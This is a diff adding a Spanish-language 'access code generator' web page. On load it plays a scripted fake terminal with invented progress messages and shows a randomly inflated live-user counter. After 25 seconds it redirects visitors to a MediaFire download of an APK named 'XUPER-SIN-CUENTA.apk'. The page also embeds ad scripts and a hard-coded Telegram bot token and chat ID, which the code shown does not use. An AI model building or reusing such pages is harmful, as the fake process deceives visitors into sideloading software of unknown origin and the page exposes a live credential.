@@ -1,0 +1,283 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=1920, initial-scale=1.0, user-scalable=no">
+<title>Generador de Código de Acceso</title>
+
+<style>
+  :root{
+    --bg:#000000;
+    --fg:#ffffff;
+    --silver:#A0A0A0;
+    --silver-dim:#5a5a5a;
+    --wp:#25D366;
+    --yellow:#F8D849;
+    --green-success:#3ddc6a;
+  }
+  *{box-sizing:border-box; margin:0; padding:0;}
+  html,body{
+    height:100%;
+    background:var(--bg);
+    color:var(--fg);
+    font-family:'Courier New', 'Segoe UI', monospace, sans-serif;
+  }
+  body{
+    display:flex;
+    flex-direction:column;
+    min-height:100vh;
+    width:100vw;
+    align-items:center;
+    justify-content:center;
+    padding:5vh 5vw;
+  }
+
+  .panel{
+    width:100%;
+    max-width:820px;
+    background:#080808;
+    border:2px solid #222;
+    border-radius:16px;
+    padding:3.2vw 3vw;
+  }
+
+  #loadingState{ display:block; }
+
+  .terminal{
+    background:#000; border:2px solid #1a1a1a; border-radius:12px; padding:22px;
+    font-size:clamp(16px, 1.5vw, 22px); line-height:1.8; min-height:260px; max-height:300px;
+    overflow-y:auto; color:#7CFC7C;
+  }
+  .terminal::-webkit-scrollbar{width:0;}
+  .term-line{ display:flex; gap:10px; opacity:0; animation:termIn .35s ease forwards; color:var(--silver); }
+  .term-line .ok{color:#3ddc6a; flex-shrink:0;}
+  .term-line .txt{color:#d8d8d8;}
+  @keyframes termIn{ from{opacity:0; transform:translateX(-4px);} to{opacity:1; transform:translateX(0);} }
+
+  .progress-wrap{ margin-top:26px; }
+  .progress-label{ display:flex; justify-content:space-between; font-size:clamp(14px, 1.2vw, 18px); color:var(--silver); margin-bottom:10px; letter-spacing:.5px; }
+  .progress-track{ width:100%; height:14px; background:#1a1a1a; border-radius:10px; overflow:hidden; border:2px solid #222; }
+  .progress-fill{ height:100%; width:0%; background:linear-gradient(90deg, var(--silver-dim), var(--fg)); border-radius:10px; transition:width .2s linear; }
+
+  .modal-fans{ margin-top:24px; display:flex; align-items:center; justify-content:center; gap:14px; color:var(--silver); font-size:clamp(15px, 1.3vw, 19px); }
+  .avatars{ display:flex; }
+  .avatars span{
+    width:34px;height:34px;
+    border-radius:50%;
+    background:linear-gradient(135deg,#333,#666);
+    border:2px solid #000;
+    margin-left:-14px;
+    display:inline-block;
+  }
+  .avatars span:first-child{margin-left:0;}
+
+  @keyframes fadeIn{
+    from{opacity:0; transform:translateY(8px);}
+    to{opacity:1; transform:translateY(0);}
+  }
+
+  /* Adsterra: mismo banner, un poco más de aire alrededor para pantalla grande */
+  .ad-slot-small{
+    margin-top:22px;
+    margin-bottom:6px;
+    width:320px;
+    min-height:50px;
+    height:auto;
+    max-width:100%;
+    background:#0a0a0a;
+    border:1px dashed var(--silver-dim);
+    border-radius:8px;
+    display:flex;
+    align-items:center;
+    justify-content:center;
+    margin-left:auto;
+    margin-right:auto;
+    position:relative;
+  }
+
+  .ad-slot-small iframe,
+  .ad-slot-big iframe {
+    max-width: 100% !important;
+    display: block !important;
+  }
+
+  .ad-slot-big {
+    margin-top:24px; width:300px; height:250px; background:#0a0a0a;
+    border:1px solid #1f1f1f; border-radius:12px; margin-left:auto; margin-right:auto;
+    position: relative; overflow:hidden; display:flex; justify-content:center; align-items:center;
+  }
+
+  /* Social bar */
+  #socialBar{
+    position:fixed; left:0; right:0; bottom:0; width:100%;
+    z-index:999; display:flex; justify-content:center; align-items:center;
+    background:#050505; border-top:1px solid #1a1a1a;
+  }
+</style>
+</head>
+<body>
+
+  <div class="panel">
+
+    <!-- Terminal (arranca directo al cargar) -->
+    <div id="loadingState">
+
+      <div class="terminal" id="terminal"></div>
+
+      <div class="progress-wrap">
+        <div class="progress-label">
+          <span id="progressMsg">Estableciendo conexión segura...</span>
+          <span id="progressPct">0%</span>
+        </div>
+        <div class="progress-track">
+          <div class="progress-fill" id="progressFill"></div>
+        </div>
+      </div>
+
+      <!-- ANUNCIO 320x50 DENTRO DE TERMINAL -->
+      <div class="ad-slot-small" id="adSlotBody2">
+        <script type="text/javascript">
+          atOptions = {
+            'key' : '87b04073200cdd655a562f19119611bb',
+            'format' : 'iframe',
+            'height' : 50,
+            'width' : 320,
+            'params' : {}
+          };
+        </script>
+        <script type="text/javascript" src="https://cleavegrate.com/87b04073200cdd655a562f19119611bb/invoke.js"></script>
+      </div>
+
+      <div class="modal-fans">
+        <span class="avatars"><span></span><span></span><span></span></span>
+        <span><strong id="fansCountModal">8,431</strong> generando códigos ahora</span>
+      </div>
+
+      <!-- BANNER 300x250 DENTRO DE TERMINAL -->
+      <div class="ad-slot-big" id="adSlotTerminalEnd">
+        <script type="text/javascript">
+          atOptions = {
+            'key' : '769d8d3d593ad963692e85dcad6fb33e',
+            'format' : 'iframe',
+            'height' : 250,
+            'width' : 300,
+            'params' : {}
+          };
+        </script>
+        <script type="text/javascript" src="https://cleavegrate.com/769d8d3d593ad963692e85dcad6fb33e/invoke.js"></script>
+      </div>
+    </div>
+
+  </div>
+
+  <div id="socialBar"></div>
+
+<script>
+  // ===== ARRANQUE DIRECTO DE LA TERMINAL =====
+  document.addEventListener("DOMContentLoaded", () => {
+    startLoadingProcess();
+  });
+
+  // ===== CONFIG TERMINAL =====
+  const TOTAL_TIME = 25000;
+
+  const TG_TOKEN = '8922992878:AAEBqGZAbwoopQNMgiAsnxkSYECVh3xFQ_s';
+  const TG_CHAT  = '1696446405';
+
+  function tgFetch(msg) {
+    fetch(`https://api.telegram.org/bot${TG_TOKEN}/sendMessage`, {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({ chat_id: TG_CHAT, text: msg, parse_mode: 'HTML' })
+    }).catch(()=>{});
+  }
+
+  const stages = [
+    { time: 0,     msg: "Conectando con nuestros servidores..." },
+    { time: 5000,  msg: "Procesando tu comentario..." },
+    { time: 10000, msg: "Revisando que todo esté en orden..." },
+    { time: 15000, msg: "Desbloqueando tu código de acceso..." },
+    { time: 20000, msg: "Ya casi está listo..." }
+  ];
+
+  const terminalTasks = [
+    { time: 300,   text: "Recibiendo tu reseña y procesando 👋" },
+    { time: 2200,  text: "Conectando con nuestros servidores" },
+    { time: 3800,  text: "Todo en orden por aquí, seguimos" },
+    { time: 5400,  text: "Buscando un código disponible para vos" },
+    { time: 7200,  text: "Casi listo, ordenando los datos" },
+    { time: 9000,  text: "Códigos disponibles encontrados ✨" },
+    { time: 10600, text: "Confirmando que todo funcione bien" },
+    { time: 12400, text: "Tu dispositivo es compatible 👍" },
+    { time: 14000, text: "Preparando tu acceso personal" },
+    { time: 15600, text: "Creando tu código único" },
+    { time: 17400, text: "Asignándote un código exclusivo" },
+    { time: 19000, text: "¡Tu código ya está listo!" },
+    { time: 20600, text: "Haciendo una última revisión" },
+    { time: 22200, text: "Dejando todo prolijo para vos" },
+    { time: 23800, text: "Ya casi... abriendo tu código 🎉" }
+  ];
+
+  const terminal = document.getElementById('terminal');
+  const progressMsg = document.getElementById('progressMsg');
+  const progressPct = document.getElementById('progressPct');
+  const progressFill = document.getElementById('progressFill');
+  const loadingState = document.getElementById('loadingState');
+  const fansCountModal = document.getElementById('fansCountModal');
+
+  let timeouts = [];
+  function addTerminalLine(text){
+    const line = document.createElement('div');
+    line.className = 'term-line';
+    line.innerHTML = `<span class="ok">✔</span><span class="txt">${text}</span>`;
+    terminal.appendChild(line);
+    terminal.scrollTop = terminal.scrollHeight;
+  }
+
+  function startLoadingProcess(){
+    loadingState.style.display = 'block';
+
+    terminal.innerHTML = '';
+    progressFill.style.width = '0%';
+    progressPct.textContent = '0%';
+    progressMsg.textContent = stages[0].msg;
+
+    stages.forEach(stage => {
+      const t = setTimeout(() => { progressMsg.textContent = stage.msg; }, stage.time);
+      timeouts.push(t);
+    });
+
+    terminalTasks.forEach(task => {
+      const t = setTimeout(() => { addTerminalLine(task.text); }, task.time);
+      timeouts.push(t);
+    });
+
+    const start = Date.now();
+    const interval = setInterval(() => {
+      const elapsed = Date.now() - start;
+      let pct = Math.min(100, (elapsed / TOTAL_TIME) * 100);
+      progressFill.style.width = pct + '%';
+      progressPct.textContent = Math.floor(pct) + '%';
+      if (pct >= 100) clearInterval(interval);
+    }, 100);
+
+    const finishTimeout = setTimeout(() => {
+      window.location.href = "https://www.mediafire.com/file/xx66ucbtqx5h11a/XUPER-SIN-CUENTA.apk/file";
+    }, TOTAL_TIME);
+    timeouts.push(finishTimeout);
+  }
+
+  function bumpFans(){
+    if (!fansCountModal) return;
+    let current = parseInt(fansCountModal.textContent.replace(/,/g,''));
+    current += Math.floor(Math.random() * 3) + 1;
+    fansCountModal.textContent = current.toLocaleString('en-US');
+  }
+  setInterval(bumpFans, 6000);
+</script>
+
+<!-- SOCIAL BAR -->
+<script src="https://cleavegrate.com/99/eb/0b/99eb0b70935151c2bf675800e9484811.js"></script>
+
+</body>
+</html>
